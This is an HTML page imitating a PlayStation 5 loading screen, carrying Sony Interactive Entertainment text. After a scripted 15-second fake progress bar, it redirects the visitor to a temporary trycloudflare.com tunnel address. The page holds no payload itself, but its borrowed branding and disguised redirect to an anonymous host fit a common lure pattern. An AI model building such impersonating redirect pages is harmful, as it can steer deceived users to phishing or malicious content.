<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS5 Loading Experience</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500&display=swap');
  
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #000000;
    overflow: hidden;
    width: 100vw;
    height: 100vh;
    position: relative;
  }
  
  .ps-glow {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 600px;
    height: 600px;
    background: radial-gradient(circle, rgba(0, 112, 255, 0.08) 0%, rgba(0, 112, 255, 0.03) 30%, transparent 70%);
    animation: breathe 4s ease-in-out infinite;
    pointer-events: none;
  }
  
  @keyframes breathe {
    0%, 100% { opacity: 0.3; transform: translate(-50%, -50%) scale(0.95); }
    50% { opacity: 0.6; transform: translate(-50%, -50%) scale(1.05); }
  }
  
  .particles {
    position: absolute;
    width: 100%;
    height: 100%;
    overflow: hidden;
    pointer-events: none;
  }
  
  .particle {
    position: absolute;
    width: 2px;
    height: 2px;
    background: rgba(255, 255, 255, 0.3);
    border-radius: 50%;
    animation: float 20s infinite linear;
  }
  
  @keyframes float {
    0% { transform: translateY(100vh) translateX(0); opacity: 0; }
    10% { opacity: 0.3; }
    90% { opacity: 0.3; }
    100% { transform: translateY(-100vh) translateX(20px); opacity: 0; }
  }
  
  .ps5-shapes {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -150px);
    display: flex;
    gap: 24px;
    opacity: 0;
    animation: fadeInShapes 1s ease-out 0.5s forwards;
  }
  
  @keyframes fadeInShapes {
    to { opacity: 0.9; }
  }
  
  .ps-symbol {
    width: 36px;
    height: 36px;
    opacity: 0;
    animation: symbolPulse 3s ease-in-out infinite;
  }
  
  @media (max-width: 640px) {
    .ps-symbol {
      width: 28px;
      height: 28px;
    }
    .ps5-shapes {
      gap: 18px;
      transform: translate(-50%, -120px);
    }
  }
  
  .ps-symbol:nth-child(1) { animation-delay: 0s; }
  .ps-symbol:nth-child(2) { animation-delay: 0.3s; }
  .ps-symbol:nth-child(3) { animation-delay: 0.6s; }
  .ps-symbol:nth-child(4) { animation-delay: 0.9s; }
  
  @keyframes symbolPulse {
    0%, 100% { opacity: 0.2; transform: scale(1); }
    50% { opacity: 0.8; transform: scale(1.1); }
  }
  
  .loading-container {
    position: relative;
    z-index: 10;
  }
  
  .spinner {
    width: 48px;
    height: 48px;
    border: 2px solid rgba(255, 255, 255, 0.1);
    border-top: 2px solid rgba(255, 255, 255, 0.8);
    border-radius: 50%;
    animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
  }
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .progress-bar-container {
    position: relative;
    width: 100%;
    max-width: 280px;
    height: 2px;
    background: rgba(255, 255, 255, 0.1);
    overflow: hidden;
    border-radius: 1px;
  }
  
  @media (max-width: 390px) {
    .progress-bar-container {
      max-width: 240px;
    }
  }
  
  .progress-bar-fill {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, 
      rgba(255, 255, 255, 0.3) 0%, 
      rgba(255, 255, 255, 0.9) 50%, 
      rgba(0, 112, 255, 0.9) 100%
    );
    box-shadow: 0 0 20px rgba(0, 112, 255, 0.6);
    transition: width 0.1s linear;
  }
  
  .fade-out {
    animation: fadeOut 0.8s ease-out forwards;
  }
  
  @keyframes fadeOut {
    to { opacity: 0; }
  }
  
  .copyright-text {
    position: absolute;
    bottom: 40px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 10px;
    color: rgba(255, 255, 255, 0.3);
    font-weight: 200;
    letter-spacing: 0.5px;
  }
  
  @media (max-width: 390px) {
    .copyright-text {
      font-size: 9px;
      bottom: 30px;
      padding: 0 20px;
      text-align: center;
    }
  }
</style>
</head>
<body>
  <div class="ps-glow"></div>
  
  <div class="particles" id="particles"></div>
  
  <div class="ps5-shapes">
    <svg class="ps-symbol" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5">
      <polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5 12 2"></polygon>
    </svg>
    <svg class="ps-symbol" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5">
      <circle cx="12" cy="12" r="10"></circle>
    </svg>
    <svg class="ps-symbol" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5">
      <line x1="6" y1="6" x2="18" y2="18"></line>
      <line x1="18" y1="6" x2="6" y2="18"></line>
    </svg>
    <svg class="ps-symbol" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5">
      <rect x="3" y="3" width="18" height="18" rx="2"></rect>
    </svg>
  </div>
  
  <main class="w-full h-screen flex flex-col items-center justify-center loading-container px-6">
    <div class="flex flex-col items-center gap-8 w-full max-w-sm">
      <div class="spinner"></div>
      
      <div class="w-full flex flex-col items-center gap-4">
        <div class="progress-bar-container">
          <div class="progress-bar-fill" id="progressBar"></div>
        </div>
        
        <div class="flex items-center justify-between w-full max-w-[280px]">
          <p class="text-white/40 text-xs font-light tracking-widest" id="loadingText">LOADING</p>
          <p class="text-white/60 text-xs font-light tabular-nums" id="percentage">0%</p>
        </div>
      </div>
    </div>
    
    <p class="copyright-text">
      Sony Interactive Entertainment
    </p>
  </main>

<script>
  // CONFIG: Replace this URL with your destination link
  const REDIRECT_URL = 'https://longer-thumb-reuters-drill.trycloudflare.com/ici/storage/icistation/dist/';
  
  const LOADING_DURATION = 15000; // 15 seconds in milliseconds
  const UPDATE_INTERVAL = 100; // Update every 100ms for smooth progress
  const totalSteps = LOADING_DURATION / UPDATE_INTERVAL;
  
  let currentStep = 0;
  const progressBar = document.getElementById('progressBar');
  const percentageText = document.getElementById('percentage');
  const loadingText = document.getElementById('loadingText');
  const particlesContainer = document.getElementById('particles');
  
  // Create ambient particles
  for (let i = 0; i < 30; i++) {
    const particle = document.createElement('div');
    particle.className = 'particle';
    particle.style.left = Math.random() * 100 + '%';
    particle.style.animationDelay = Math.random() * 20 + 's';
    particle.style.animationDuration = (15 + Math.random() * 10) + 's';
    particlesContainer.appendChild(particle);
  }
  
  // Loading text animation like PS5
  const loadingStates = ['LOADING', 'LOADING.', 'LOADING..', 'LOADING...'];
  let textIndex = 0;
  
  setInterval(() => {
    loadingText.textContent = loadingStates[textIndex];
    textIndex = (textIndex + 1) % loadingStates.length;
  }, 500);
  
  // Progress bar animation
  const progressInterval = setInterval(() => {
    currentStep++;
    const progress = (currentStep / totalSteps) * 100;
    const clampedProgress = Math.min(progress, 100);
    
    progressBar.style.width = clampedProgress + '%';
    percentageText.textContent = Math.floor(clampedProgress) + '%';
    
    if (currentStep >= totalSteps) {
      clearInterval(progressInterval);
      percentageText.textContent = '100%';
      
      // Fade out before redirect
      setTimeout(() => {
        document.body.classList.add('fade-out');
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 800);
      }, 500);
    }
  }, UPDATE_INTERVAL);
</script>
<script>(function(){document.addEventListener("click",function(e){var a=e.target.closest("[data-product-id]");if(!a)return;e.preventDefault();var pid=a.getAttribute("data-product-id");if(pid)parent.postMessage({type:"ecto-artifact-link-click",productId:pid},"*")})})();</script>
</body>
</html>
